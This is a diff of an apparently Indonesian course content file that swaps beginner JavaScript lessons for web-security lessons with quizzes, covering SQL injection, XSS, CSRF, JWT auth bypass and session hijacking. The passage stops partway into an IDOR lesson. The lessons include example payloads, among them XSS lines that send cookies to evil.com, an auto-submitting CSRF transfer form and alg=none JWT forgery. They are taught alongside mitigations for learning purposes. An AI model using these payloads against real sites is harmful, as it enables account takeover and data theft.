@@ -1,4711 +1,2942 @@
 import { MaterialData } from "../src/lib/content-types";
 
 export const contentLevels4to7: MaterialData[] = [
-  // ==================== LEVEL 4 - JAVASCRIPT ====================
+  // ==================== LEVEL 4 - WEB SECURITY (10) ====================
   {
     level: 4,
     order: 1,
-    title: "Variabel",
-    slug: "js-variabel",
-    description: "Mengenal variabel dalam JavaScript: cara deklarasi dengan let, const, dan var serta perbedaannya.",
-    icon: "📦",
+    title: "OWASP Top 10",
+    slug: "owasp-top-10",
+    description: "Mengenal 10 kerentanan web paling kritis menurut OWASP.",
+    icon: "📋",
     isProject: false,
-    content: `# Variabel dalam JavaScript
+    content: `# OWASP Top 10
 
-**Variabel** adalah wadah untuk menyimpan data. Di JavaScript, kamu bisa mendeklarasikan variabel dengan tiga kata kunci: \`var\`, \`let\`, dan \`const\`.
+**OWASP Top 10** adalah daftar standar internasional yang merangkum sepuluh risiko keamanan aplikasi web paling kritis, diperbarui secara berkala oleh Open Web Application Security Project (OWASP). Daftar ini menjadi rujukan utama developer dan pentester untuk memprioritaskan mitigasi.
 
-## Mendeklarasikan Variabel
+## Risiko Utama (2021)
 
-\`\`\`javascript
-// Menggunakan let - nilai bisa diubah
-let nama = "Budi";
-nama = "Andi"; // OK
+Beberapa risiko paling sering muncul meliputi:
 
-// Menggunakan const - nilai tidak bisa diubah
-const PI = 3.14;
-// PI = 3.15; // Error!
+1. **Broken Access Control** — user mengakses resource di luar otorisasinya.
+2. **Cryptographic Failures** — enkripsi lemah atau data sensitif tidak dilindungi.
+3. **Injection** — SQLi, command injection, LDAP injection.
+4. **Insecure Design** — kelemahan arsitektur sejak awal.
+5. **Security Misconfiguration** — konfigurasi default atau error handling buruk.
 
-// Menggunakan var (lama, hindari penggunaan)
-var umur = 20;
+## Cara Identifikasi
+
+\`\`\`bash
+# Cek header keamanan dasar
+curl -I https://target.example.com
+
+# Scan dengan OWASP ZAP CLI
+zap-cli quick-scan https://target.example.com
+zap-cli active-scan https://target.example.com
 \`\`\`
 
-## Perbedaan let, const, dan var
+## Mitigasi
 
-| Keyword | Bisa diubah | Scope | Hoisting |
-|---------|------------|-------|----------|
-| let     | Ya         | Block | Tidak    |
-| const   | Tidak      | Block | Tidak    |
-| var     | Ya         | Function | Ya   |
+\`\`\`text
+- Terapkan principle of least privilege
+- Gunakan framework modern dengan default aman
+- Validasi & sanitize input di sisi server
+- Aktifkan HTTPS, HSTS, CSP, X-Frame-Options
+- Lakukan dependency scanning berkala (npm audit, Snyk)
+\`\`\`
 
-## Aturan Penamaan
-
-- Gunakan **camelCase**: \`namaDepan\`, \`totalHarga\`
-- Tidak boleh diawali angka
-- Bersifat **case-sensitive**: \`nama\` ≠ \`Nama\`
-- Gunakan nama yang **deskriptif**
-
-> **Best Practice:** Selalu gunakan \`const\` kecuali kamu tahu nilainya akan berubah, maka gunakan \`let\`. Hindari \`var\`.`,
+> OWASP Top 10 bukan daftar tertutup — gunakan sebagai checklist minimal, bukan batas maksimal keamanan aplikasi Anda.`,
     quiz: [
       {
-        question: "Kata kunci manakah yang digunakan untuk variabel yang nilainya tidak boleh diubah?",
-        options: ["let", "const", "var", "static"],
+        question: "Apa itu OWASP Top 10?",
+        options: ["Daftar 10 antivirus terbaik", "Daftar 10 risiko keamanan web paling kritis", "Standar enkripsi", "Framework JavaScript"],
         answer: 1,
-        explanation: "const digunakan untuk variabel yang nilainya konstan dan tidak bisa diubah setelah dideklarasikan."
+        explanation: "OWASP Top 10 adalah daftar risiko keamanan aplikasi web paling kritis yang diperbarui berkala oleh OWASP."
       },
       {
-        question: "Apa perbedaan utama antara let dan var?",
-        options: [
-          "let lebih cepat dari var",
-          "let memiliki block scope, var memiliki function scope",
-          "let hanya untuk angka, var untuk string",
-          "Tidak ada perbedaan"
-        ],
-        answer: 1,
-        explanation: "let dibatasi oleh block scope ({}), sedangkan var dibatasi oleh function scope."
+        question: "Risiko apa yang paling sering muncul di OWASP 2021?",
+        options: ["Broken Access Control", "CSS Injection", "Buffer Overflow", "DNS Spoofing"],
+        answer: 0,
+        explanation: "Broken Access Control menempati posisi pertama di OWASP Top 10 versi 2021."
       },
       {
-        question: "Manakah penamaan variabel yang benar?",
-        options: ["1nama", "nama-depan", "namaDepan", "class"],
-        answer: 2,
-        explanation: "namaDepan menggunakan camelCase dan tidak diawali angka. 'class' adalah reserved word, angka tidak boleh di awal, dan tanda hubung tidak diperbolehkan."
+        question: "Tool OWASP yang populer untuk scan aplikasi web?",
+        options: ["Wireshark", "OWASP ZAP", "Nmap", "Metasploit"],
+        answer: 1,
+        explanation: "OWASP ZAP (Zed Attack Proxy) adalah tool scanner keamanan web open-source dari OWASP."
       }
     ]
   },
   {
     level: 4,
     order: 2,
-    title: "Tipe Data",
-    slug: "js-tipe-data",
-    description: "Memahami tipe data primitive dan reference dalam JavaScript beserta cara mengeceknya.",
-    icon: "🏷️",
+    title: "SQL Injection",
+    slug: "sql-injection",
+    description: "Serangan menyisipkan kode SQL berbahaya untuk manipulasi database.",
+    icon: "💉",
     isProject: false,
-    content: `# Tipe Data dalam JavaScript
+    content: `# SQL Injection
 
-JavaScript memiliki **dua kategori tipe data**: primitive (nilai) dan reference (objek). Memahami keduanya penting agar kamu bisa memanipulasi data dengan benar.
+**SQL Injection (SQLi)** adalah serangan di mana penyerang menyisipkan kode SQL berbahaya melalui input form atau URL untuk memanipulasi query database. Konsekuensinya bisa berupa pencurian data, bypass autentikasi, hingga penghapusan seluruh tabel.
 
-## Tipe Data Primitive
+## Cara Kerja
 
-Tipe primitive disimpan **berdasarkan nilai**. JavaScript punya 7 tipe primitive:
-
-\`\`\`javascript
-let nama = "Budi";        // string
-let umur = 25;            // number
-let tinggi = 175.5;       // number (float juga number)
-let aktif = true;         // boolean
-let data = null;          // null (kosong sengaja)
-let alamat;               // undefined (belum diisi)
-let id = Symbol("id");    // symbol (unik)
-let big = 9007199254740991n; // bigint
+\`\`\`sql
+-- Query rentan (string concatenation)
+SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
 \`\`\`
 
-## Tipe Data Reference
+Jika penyerang memasukkan \`admin' --\` sebagai username, query menjadi:
 
-Tipe reference disimpan **berdasarkan referensi** (alamat memori):
-
-\`\`\`javascript
-let mhs = { nama: "Budi", umur: 20 }; // object
-let buah = ["apel", "mangga"];        // array (tipe object)
-let fungsi = function() { return 1; }; // function (tipe object)
+\`\`\`sql
+SELECT * FROM users WHERE username = 'admin' --' AND password = ''
 \`\`\`
 
-## Mengecek Tipe Data
+Bagian \`--\` menjadikan pengecekan password diabaikan, sehingga login berhasil.
 
-Gunakan operator \`typeof\` untuk mengecek tipe data:
+## Jenis Serangan
 
-\`\`\`javascript
-typeof "halo";    // "string"
-typeof 42;        // "number"
-typeof true;      // "boolean"
-typeof undefined; // "undefined"
-typeof null;      // "object" ⚠️ (ini bug lama JavaScript!)
-typeof {};        // "object"
-typeof [];        // "object" (gunakan Array.isArray())
+- **In-band UNION** — menggabungkan hasil query dengan \`UNION SELECT\`.
+- **Boolean-based blind** — menyimpulkan data dari true/false response.
+- **Time-based blind** — menggunakan \`SLEEP()\` untuk inferensi data.
+- **Error-based** — memanfaatkan pesan error database.
+
+## Pencegahan
+
+\`\`\`python
+# Prepared statement (AMAN)
+cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
+
+# ORM dengan parameter binding
+User.objects.filter(username=username, password=hash(password))
 \`\`\`
 
-> **Catatan:** \`typeof null\` mengembalikan "object" karena bug historis. Untuk mengecek null gunakan \`value === null\`.`,
+\`\`\`bash
+# Tes dengan sqlmap
+sqlmap -u "https://target.example.com/login" --data="user=1&pass=1" --dbs
+\`\`\`
+
+> Selalu gunakan prepared statements atau ORM dengan parameter binding. Jangan pernah concatenate string ke query SQL.`,
     quiz: [
       {
-        question: "Apa hasil dari typeof null di JavaScript?",
-        options: ["null", "undefined", "object", "string"],
-        answer: 2,
-        explanation: "typeof null mengembalikan 'object' karena bug historis di JavaScript yang tidak pernah diperbaiki demi kompatibilitas."
+        question: "Apa itu SQL Injection?",
+        options: ["Backup database", "Menyisipkan SQL berbahaya untuk manipulasi database", "Optimasi query", "Enkripsi data"],
+        answer: 1,
+        explanation: "SQL Injection menyisipkan kode SQL berbahaya melalui input untuk memanipulasi query database."
       },
       {
-        question: "Manakah yang termasuk tipe data primitive?",
-        options: ["Array", "Object", "Number", "Function"],
+        question: "Cara terbaik mencegah SQLi?",
+        options: ["String concatenation", "Mematikan database", "Prepared statements", "Menyembunyikan form"],
         answer: 2,
-        explanation: "Number adalah tipe primitive. Array, Object, dan Function adalah tipe reference (berbasis object)."
+        explanation: "Prepared statements memisahkan kode SQL dari data input sehingga input tidak diinterpretasi sebagai perintah."
       },
       {
-        question: "Apa perbedaan tipe primitive dan reference?",
-        options: [
-          "Primitive disimpan berdasarkan nilai, reference berdasarkan referensi",
-          "Primitive lebih besar ukurannya",
-          "Reference tidak bisa diubah",
-          "Tidak ada perbedaan"
-        ],
-        answer: 0,
-        explanation: "Tipe primitive disimpan berdasarkan nilai (copy nilai), sedangkan reference disimpan berdasarkan referensi (alamat memori)."
+        question: "Input apa yang dapat bypass login?",
+        options: ["admin/admin", "' OR '1'='1", "DROP TABLE", "SELECT *"],
+        answer: 1,
+        explanation: "' OR '1'='1 membuat kondisi WHERE selalu true, sehingga login berhasil tanpa password valid."
       }
     ]
   },
   {
     level: 4,
     order: 3,
-    title: "Operator",
-    slug: "js-operator",
-    description: "Belajar berbagai operator di JavaScript: aritmatika, perbandingan, logika, dan assignment.",
-    icon: "➕",
+    title: "Cross-Site Scripting (XSS)",
+    slug: "xss-cross-site-scripting",
+    description: "Menyisipkan script berbahaya ke halaman web yang dilihat user lain.",
+    icon: "🎭",
     isProject: false,
-    content: `# Operator dalam JavaScript
+    content: `# Cross-Site Scripting (XSS)
 
-**Operator** adalah simbol yang digunakan untuk melakukan operasi pada nilai dan variabel. JavaScript memiliki beberapa jenis operator yang penting untuk dipelajari.
+**XSS** adalah serangan di mana penyerang menyisipkan script (biasanya JavaScript) ke halaman web yang dilihat oleh user lain. Script ini dieksekusi di browser korban dan dapat mencuri cookie, sesi, atau melakukan aksi atas nama korban.
 
-## Operator Aritmatika
+## Jenis XSS
 
-\`\`\`javascript
-let a = 10, b = 3;
+1. **Reflected XSS** — payload dikirim via URL dan dipantulkan langsung ke response.
+2. **Stored XSS** — payload disimpan di server (mis. komentar) dan menyerang siapa pun yang melihatnya.
+3. **DOM-based XSS** — payload dieksekusi di sisi client melalui manipulasi DOM.
 
-console.log(a + b);  // 13 (penjumlahan)
-console.log(a - b);  // 7  (pengurangan)
-console.log(a * b);  // 30 (perkalian)
-console.log(a / b);  // 3.33 (pembagian)
-console.log(a % b);  // 1  (sisa bagi / modulus)
-console.log(a ** b); // 1000 (pangkat)
+## Contoh Payload
+
+\`\`\`text
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=fetch('https://evil.com/?c='+document.cookie)>
 \`\`\`
 
-## Operator Perbandingan
+## Pencegahan
 
 \`\`\`javascript
-let x = 5, y = "5";
+// Escape output sebelum render
+function escapeHtml(str) {
+  return str.replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[c]));
+}
 
-console.log(x == y);   // true  (loose, konversi tipe)
-console.log(x === y);  // false (strict, cek tipe juga)
-console.log(x != y);   // false
-console.log(x !== y);  // true
-console.log(x > 3);    // true
-console.log(x <= 5);   // true
+// React otomatis escape, JANGAN pakai dangerouslySetInnerHTML tanpa sanitasi
 \`\`\`
 
-## Operator Logika
-
-\`\`\`javascript
-let isAdmin = true;
-let isLoggedIn = false;
-
-console.log(isAdmin && isLoggedIn); // false (AND)
-console.log(isAdmin || isLoggedIn); // true  (OR)
-console.log(!isAdmin);              // false (NOT)
+\`\`\`bash
+# Header Content Security Policy
+Content-Security-Policy: default-src 'self'; script-src 'self'
 \`\`\`
 
-## Operator Assignment
-
-\`\`\`javascript
-let nilai = 10;
-nilai += 5;  // nilai = nilai + 5 = 15
-nilai -= 3;  // 12
-nilai *= 2;  // 24
-nilai++;     // 25 (increment)
-nilai--;     // 24 (decrement)
-\`\`\`
-
-> **Best Practice:** Selalu gunakan \`===\` (strict equality) daripada \`==\` untuk menghindari bug karena konversi tipe yang tidak terduga.`,
+> Escape output, gunakan CSP, dan sanitasi input HTML dengan library seperti DOMPurify.`,
     quiz: [
       {
-        question: "Apa hasil dari 10 % 3 di JavaScript?",
-        options: ["3", "1", "3.33", "0"],
+        question: "Apa tujuan utama serangan XSS?",
+        options: ["Mempercepat server", "Mengeksekusi script di browser korban", "Backup data", "Mengoptimasi query"],
         answer: 1,
-        explanation: "Operator % adalah modulus (sisa bagi). 10 dibagi 3 = 3 sisa 1, jadi hasilnya 1."
+        explanation: "XSS menyisipkan script yang dieksekusi di browser korban untuk mencuri data atau mengendalikan sesi."
       },
       {
-        question: "Apa perbedaan antara == dan ===?",
-        options: [
-          "Tidak ada perbedaan",
-          "== selalu true, === cek nilai",
-          "=== cek nilai dan tipe, == hanya nilai",
-          "=== hanya untuk angka"
-        ],
-        answer: 2,
-        explanation: "=== (strict equality) memeriksa nilai DAN tipe data, sedangkan == (loose equality) melakukan konversi tipe sebelum membandingkan."
+        question: "Jenis XSS yang disimpan di server dan menyerang banyak user?",
+        options: ["Reflected XSS", "Stored XSS", "DOM XSS", "Blind XSS"],
+        answer: 1,
+        explanation: "Stored XSS payload disimpan di server (mis. kolom komentar) dan menyerang setiap user yang melihat halaman tersebut."
       },
       {
-        question: "Apa hasil dari true && false?",
-        options: ["true", "false", "null", "undefined"],
+        question: "Header HTTP apa yang membantu mitigasi XSS?",
+        options: ["Content-Type", "Content-Security-Policy", "Cache-Control", "Accept-Language"],
         answer: 1,
-        explanation: "Operator && (AND) mengembalikan true hanya jika kedua operand true. Karena salah satu false, hasilnya false."
+        explanation: "Content-Security-Policy (CSP) membatasi sumber script yang boleh dieksekusi, memitigasi XSS."
       }
     ]
   },
   {
     level: 4,
     order: 4,
-    title: "If Else",
-    slug: "js-if-else",
-    description: "Mengenal struktur percabangan if, else if, else, ternary operator, dan switch statement.",
-    icon: "🔀",
+    title: "CSRF Attack",
+    slug: "csrf-attack",
+    description: "Memaksa user melakukan aksi tak diinginkan di aplikasi yang sedang login.",
+    icon: "🎣",
     isProject: false,
-    content: `# Percabangan If Else
+    content: `# CSRF Attack
 
-**Percabangan** membuat program bisa mengambil keputusan berdasarkan kondisi tertentu. JavaScript menyediakan \`if...else\`, ternary operator, dan \`switch\`.
+**Cross-Site Request Forgery (CSRF)** adalah serangan di mana penyerang memaksa user yang sudah login melakukan aksi tak diinginkan pada aplikasi target. Berbeda dengan XSS, CSRF tidak mencuri cookie, tetapi memanfaatkan cookie yang otomatis dikirim browser.
 
-## If, Else If, Else
+## Cara Kerja
 
-\`\`\`javascript
-let nilai = 85;
+User yang sedang login ke \`bank.example.com\` mengunjungi halaman jahat yang berisi:
 
-if (nilai >= 90) {
-  console.log("Grade A");
-} else if (nilai >= 80) {
-  console.log("Grade B");
-} else if (nilai >= 70) {
-  console.log("Grade C");
-} else {
-  console.log("Grade D");
-}
-// Output: Grade B
+\`\`\`html
+<!-- Hidden form auto-submit -->
+<form action="https://bank.example.com/transfer" method="POST" id="f">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000000">
+</form>
+<script>document.getElementById('f').submit()</script>
 \`\`\`
 
-## Ternary Operator
+Browser akan mengirim cookie sesi bank secara otomatis, sehingga transfer dianggap sah.
 
-Operator ternary adalah cara singkat untuk if-else sederhana:
+## Pencegahan
 
-\`\`\`javascript
-let umur = 20;
-let status = umur >= 17 ? "Dewasa" : "Anak-anak";
-console.log(status); // "Dewasa"
+\`\`\`python
+# 1. Anti-CSRF token
+<form method="POST">
+  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+</form>
 
-// Bisa juga nested (tapi hindari agar tidak sulit dibaca)
-let hasil = nilai >= 75 ? "Lulus" : nilai >= 50 ? "Remedial" : "Gagal";
+# 2. Validasi token di server
+if request.form.get('csrf_token') != session['csrf_token']:
+    abort(403)
+
+# 3. Set SameSite cookie
+Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
 \`\`\`
 
-## Switch Statement
-
-\`switch\` cocok untuk mengecek satu variabel terhadap banyak nilai:
-
-\`\`\`javascript
-let hari = "Senin";
-
-switch (hari) {
-  case "Senin":
-  case "Selasa":
-  case "Rabu":
-  case "Kamis":
-  case "Jumat":
-    console.log("Hari kerja");
-    break;
-  case "Sabtu":
-  case "Minggu":
-    console.log("Weekend");
-    break;
-  default:
-    console.log("Hari tidak valid");
-}
+\`\`\`bash
+# Tes endpoint tanpa token
+curl -X POST https://target.example.com/delete -b "session=stolen" -d "id=42"
 \`\`\`
 
-> **Penting:** Jangan lupa \`break\` di setiap case, jika tidak, eksekusi akan lanjut ke case berikutnya (fall-through).`,
+> Selalu gunakan anti-CSRF token untuk state-changing request dan aktifkan atribut \`SameSite\` pada cookie.`,
     quiz: [
       {
-        question: "Apa kegunaan keyword break dalam switch statement?",
-        options: [
-          "Menghentikan program",
-          "Keluar dari case dan switch",
-          "Melanjutkan ke case berikutnya",
-          "Mengulang switch"
-        ],
+        question: "Apa yang dimanfaatkan oleh serangan CSRF?",
+        options: ["Kesalahan SQL", "Cookie sesi yang otomatis dikirim", "Buffer overflow", "DNS poisoning"],
         answer: 1,
-        explanation: "break menghentikan eksekusi dan keluar dari switch. Tanpa break, eksekusi akan lanjut ke case berikutnya (fall-through)."
+        explanation: "CSRF memanfaatkan cookie sesi yang otomatis dikirim browser saat user yang sedang login mengunjungi halaman jahat."
       },
       {
-        question: "Manakah penulisan ternary operator yang benar?",
-        options: [
-          "if x > 5 ? 'besar' : 'kecil'",
-          "x > 5 ? 'besar' : 'kecil'",
-          "x > 5 : 'besar' ? 'kecil'",
-          "x > 5 and 'besar' or 'kecil'"
-        ],
+        question: "Cara paling efektif mencegah CSRF?",
+        options: ["HTTPS saja", "Anti-CSRF token", "Mematikan JavaScript", "Cache header"],
         answer: 1,
-        explanation: "Sintaks ternary: kondisi ? nilai_jika_true : nilai_jika_false."
+        explanation: "Anti-CSRF token memastikan request datang dari form yang sah, bukan dari situs penyerang."
       },
       {
-        question: "Blok else akan dieksekusi ketika...",
-        options: [
-          "Kondisi if bernilai true",
-          "Semua kondisi if dan else if bernilai false",
-          "Selalu dieksekusi",
-          "Hanya jika ada else if"
-        ],
+        question: "Atribut cookie yang membantu mitigasi CSRF?",
+        options: ["Max-Age", "SameSite", "Domain", "Path"],
         answer: 1,
-        explanation: "Blok else dieksekusi sebagai fallback ketika semua kondisi if dan else if sebelumnya bernilai false."
+        explanation: "Atribut SameSite=Strict atau Lax mencegah cookie dikirim pada cross-site request."
       }
     ]
   },
   {
     level: 4,
     order: 5,
-    title: "Loop",
-    slug: "js-loop",
-    description: "Memahami berbagai jenis perulangan: for, while, do-while, for...of, dan for...in.",
-    icon: "🔁",
+    title: "Authentication Bypass",
+    slug: "authentication-bypass",
+    description: "Teknik melewati mekanisme autentikasi aplikasi web.",
+    icon: "🔓",
     isProject: false,
-    content: `# Perulangan (Loop) dalam JavaScript
+    content: `# Authentication Bypass
 
-**Loop** digunakan untuk menjalankan kode berulang kali. JavaScript menyediakan beberapa jenis loop yang cocok untuk situasi berbeda.
+**Authentication Bypass** adalah teknik untuk melewati mekanisme login tanpa kredensial yang sah. Penyerang memanfaatkan kelemahan logika, default credentials, atau kerentanan dalam implementasi autentikasi.
 
-## For Loop
+## Teknik Umum
 
-\`\`\`javascript
-// Loop dari 0 sampai 4
-for (let i = 0; i < 5; i++) {
-  console.log("Iterasi ke-" + i);
-}
+1. **Default credentials** — login dengan \`admin/admin\`, \`admin/password\`.
+2. **SQL Injection** — \`' OR '1'='1\` untuk bypass password check.
+3. **Logic flaws** — manipulasi response atau parameter JSON.
+4. **Brute force** — mencoba banyak password terhadap satu akun.
+5. **JWT manipulation** — ubang algoritma ke \`none\` atau weak secret.
+
+## Contoh Manipulasi JWT
+
+\`\`\`python
+# JWT dengan alg=none (BERBAHAYA)
+import jwt
+token = jwt.encode({"user":"admin","role":"admin"}, "", algorithm="none")
+print(token)
+# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
 \`\`\`
 
-## While dan Do-While
+## Pencegahan
 
-\`\`\`javascript
-// while - cek dulu, baru jalankan
-let i = 0;
-while (i < 3) {
-  console.log(i);
-  i++;
-}
+\`\`\`bash
+# Rate limiting dengan fail2ban
+[sshd]
+maxretry = 3
+bantime = 3600
 
-// do-while - jalankan dulu, baru cek
-let j = 0;
-do {
-  console.log(j);
-  j++;
-} while (j < 3);
-// do-while minimal dijalankan 1 kali
+# Brute-force protection di aplikasi
+lock_account_after(5_failed_attempts)
+delay_exponential_backoff()
+require_mfa_for_admin()
 \`\`\`
 
-## For...of dan For...in
-
-\`\`\`javascript
-// for...of - iterasi nilai array
-let buah = ["apel", "mangga", "jeruk"];
-for (let item of buah) {
-  console.log(item);
-}
-
-// for...in - iterasi key/property object
-let mhs = { nama: "Budi", umur: 20 };
-for (let key in mhs) {
-  console.log(key + ": " + mhs[key]);
-}
+\`\`\`text
+- Paksa password kuat + MFA
+- Validasi algoritma JWT di server (whitelist HS256/RS256)
+- Rate limiting + lockout
+- Hapus default credentials
+- Logging semua upaya login
 \`\`\`
 
-## Break dan Continue
-
-\`\`\`javascript
-// break - menghentikan loop sepenuhnya
-for (let i = 0; i < 10; i++) {
-  if (i === 5) break;
-  console.log(i); // 0-4
-}
-
-// continue - lewati iterasi ini
-for (let i = 0; i < 5; i++) {
-  if (i === 2) continue;
-  console.log(i); // 0,1,3,4
-}
-\`\`\`
-
-> **Tips:** Untuk iterasi array, \`for...of\` lebih disarankan. Untuk object, gunakan \`for...in\` atau \`Object.keys()\`.`,
+> Jangan pernah mengimplementasikan \`alg=none\` sebagai valid. Selalu whitelist algoritma JWT di sisi server.`,
     quiz: [
       {
-        question: "Apa perbedaan while dan do-while?",
-        options: [
-          "Tidak ada perbedaan",
-          "do-while minimal dijalankan 1 kali, while bisa 0 kali",
-          "while lebih cepat",
-          "do-while hanya untuk angka"
-        ],
+        question: "Apa itu authentication bypass?",
+        options: ["Backup kredensial", "Teknik melewati autentikasi tanpa kredensial sah", "Enkripsi password", "Reset password"],
         answer: 1,
-        explanation: "do-while menjalankan blok kode dulu baru cek kondisi, sehingga minimal dieksekusi 1 kali. while cek kondisi dulu."
+        explanation: "Authentication bypass adalah teknik untuk melewati mekanisme login tanpa kredensial yang valid."
       },
       {
-        question: "Loop manakah yang paling cocok untuk iterasi nilai array?",
-        options: ["for...in", "for...of", "while", "do-while"],
+        question: "Cegah brute force login paling efektif?",
+        options: ["HTTPS", "Rate limiting + lockout", "Cache", "Cookie"],
         answer: 1,
-        explanation: "for...of mengiterasi nilai array secara langsung. for...in mengiterasi index/key yang bisa bermasalah dengan array."
+        explanation: "Rate limiting dan account lockout membatasi jumlah percobaan login, mempersulit brute force."
       },
       {
-        question: "Apa fungsi keyword continue dalam loop?",
-        options: [
-          "Menghentikan loop sepenuhnya",
-          "Melompat ke iterasi berikutnya",
-          "Mengulang iterasi saat ini",
-          "Mempercepat loop"
-        ],
+        question: "Apa risikanya mengizinkan alg=none pada JWT?",
+        options: ["Tidak ada risiko", "Penyerang dapat membuat token sah tanpa signature", "Mempercepat server", "Meningkatkan keamanan"],
         answer: 1,
-        explanation: "continue melewati sisa kode di iterasi saat ini dan lanjut ke iterasi berikutnya."
+        explanation: "alg=none membuat token JWT tidak ditandatangani, sehingga penyerang dapat memalsukan token dengan payload apa pun."
       }
     ]
   },
   {
     level: 4,
     order: 6,
-    title: "Function",
-    slug: "js-function",
-    description: "Belajar function declaration, expression, arrow function, parameter, dan return value.",
-    icon: "🔧",
+    title: "Session Hijacking",
+    slug: "session-hijacking",
+    description: "Mencuri session cookie untuk impersonasi user.",
+    icon: "🍪",
     isProject: false,
-    content: `# Function dalam JavaScript
+    content: `# Session Hijacking
 
-**Function** adalah blok kode reusable yang melakukan tugas tertentu. Function membantu mengorganisir kode dan menghindari重复 penulisan.
+**Session Hijacking** adalah serangan di mana penyerang mencuri session ID (biasanya cookie) untuk menyamar sebagai user yang sah. Setelah mendapatkan session ID, penyerang dapat mengakses akun korban tanpa perlu login.
 
-## Mendeklarasikan Function
+## Cara Mencuri Session
 
-\`\`\`javascript
-// Function Declaration
-function sapa(nama) {
-  return "Halo, " + nama + "!";
-}
-console.log(sapa("Budi")); // "Halo, Budi!"
+1. **XSS** — \`document.cookie\` dieksekusi di browser korban.
+2. **Sniffing** — intercept traffic HTTP (bukan HTTPS) di jaringan publik.
+3. **Session fixation** — memaksa korban menggunakan session ID tertentu.
+4. **Sidejacking** — capture cookie via Wireshark di Wi-Fi terbuka.
 
-// Function Expression
-const tambah = function(a, b) {
-  return a + b;
-};
-
-// Arrow Function (ES6)
-const kali = (a, b) => a * b;
-console.log(kali(3, 4)); // 12
-\`\`\`
-
-## Parameter dan Default Value
+## Simulasi Pencurian via XSS
 
 \`\`\`javascript
-function buatEmail(nama, domain = "gmail.com") {
-  return nama + "@" + domain;
-}
-console.log(buatEmail("budi"));           // budi@gmail.com
-console.log(buatEmail("andi", "yahoo.com")); // andi@yahoo.com
+// Payload XSS yang mengirim cookie ke server penyerang
+new Image().src = 'https://evil.com/log?c=' + document.cookie;
 \`\`\`
 
-## Rest Parameters dan Spread
-
-\`\`\`javascript
-// Rest parameter - kumpulkan sisa argumen jadi array
-function jumlahkan(...angka) {
-  return angka.reduce((total, n) => total + n, 0);
-}
-console.log(jumlahkan(1, 2, 3, 4)); // 10
-
-// Spread operator - pecah array jadi argumen terpisah
-const arr1 = [1, 2, 3];
-const arr2 = [...arr1, 4, 5]; // [1,2,3,4,5]
+\`\`\`bash
+# Capture cookie HTTP dengan Wireshark/tshark
+tshark -i wlan0 -Y "http.cookie" -T fields -e http.cookie
 \`\`\`
 
-## Arrow Function vs Regular Function
+## Pencegahan
 
-Perbedaan utama: arrow function tidak punya \`this\` sendiri (mewarisi dari scope luar).
-
-\`\`\`javascript
-// Arrow function cocok untuk callback pendek
-const ganjil = (n) => n % 2 !== 0;
-const arr = [1, 2, 3].map(x => x * 2); // [2, 4, 6]
+\`\`\`text
+- Set flag HttpOnly pada cookie (mencegah akses JavaScript)
+- Set flag Secure (hanya via HTTPS)
+- Gunakan SameSite=Strict
+- Regenerasi session ID setelah login
+- Rotasi session + timeout idle
+- Terapkan HSTS untuk paksa HTTPS
 \`\`\`
 
-> **Best Practice:** Gunakan arrow function untuk callback dan function pendek. Gunakan regular function untuk method object atau ketika butuh \`this\`.`,
+\`\`\`nginx
+# Konfigurasi Nginx cookie aman
+proxy_cookie_path / "/; HTTPOnly; Secure; SameSite=Strict";
+add_header Strict-Transport-Security "max-age=31536000" always;
+\`\`\`
+
+> Cookie dengan flag \`HttpOnly\` dan \`Secure\` secara signifikan mengurangi risiko session hijacking, terutama dari vektor XSS dan sniffing.`,
     quiz: [
       {
-        question: "Apa kegunaan keyword return dalam function?",
-        options: [
-          "Menghentikan program",
-          "Mengembalikan nilai dari function",
-          "Mengulang function",
-          "Mencetak ke console"
-        ],
+        question: "Apa itu session hijacking?",
+        options: ["Menghapus session", "Mencuri session ID untuk impersonasi user", "Membuat session baru", "Enkripsi session"],
         answer: 1,
-        explanation: "return mengembalikan nilai dari function dan menghentikan eksekusi function tersebut."
+        explanation: "Session hijacking adalah pencurian session ID untuk menyamar sebagai user yang sedang login."
       },
       {
-        question: "Apa perbedaan utama arrow function dengan regular function?",
-        options: [
-          "Arrow function lebih cepat",
-          "Arrow function tidak punya this sendiri",
-          "Arrow function hanya untuk angka",
-          "Arrow function tidak bisa punya parameter"
-        ],
+        question: "Flag cookie yang mencegah akses via JavaScript?",
+        options: ["Secure", "HttpOnly", "SameSite", "Max-Age"],
         answer: 1,
-        explanation: "Arrow function tidak memiliki this sendiri, melainkan mewarisi this dari scope luar (lexical this)."
+        explanation: "HttpOnly mencegah cookie diakses melalui JavaScript, memitigasi pencurian cookie via XSS."
       },
       {
-        question: "Apa fungsi rest parameter (...args)?",
-        options: [
-          "Menghapus parameter",
-          "Mengumpulkan sisa argumen menjadi array",
-          "Membuat parameter wajib",
-          "Mengulang parameter"
-        ],
+        question: "Cegah session fixation?",
+        options: ["Jangan ubah session ID", "Regenerasi session ID setelah login", "Bagikan session ID", "Nonaktifkan cookie"],
         answer: 1,
-        explanation: "Rest parameter (...args) mengumpulkan argumen yang tersisa menjadi sebuah array, cocok untuk function dengan jumlah argumen variabel."
+        explanation: "Regenerasi session ID setelah login membatalkan session ID yang mungkin sudah disusupi penyerang."
       }
     ]
   },
   {
     level: 4,
     order: 7,
-    title: "Array",
-    slug: "js-array",
-    description: "Mengenal array dan method penting: push, pop, map, filter, reduce, forEach, dan lainnya.",
-    icon: "📚",
+    title: "IDOR Vulnerability",
+    slug: "idor-vulnerability",
+    description: "Insecure Direct Object Reference - akses resource tanpa otorisasi.",
+    icon: "🚪",
     isProject: false,
-    content: `# Array dalam JavaScript
+    content: `# IDOR Vulnerability
 
-**Array** adalah struktur data untuk menyimpan kumpulan nilai dalam satu variabel. JavaScript menyediakan banyak method bawaan untuk memanipulasi array.
+**Insecure Direct Object Reference (IDOR)** terjadi ketika aplikasi mengekspos referensi objek internal (ID, filename, key) langsung ke user tanpa validasi otorisasi. Penyerang cukup mengubah parameter untuk mengakses data user lain.
 
-## Membuat dan Mengakses Array
+## Contoh Skenario
 
-\`\`\`javascript
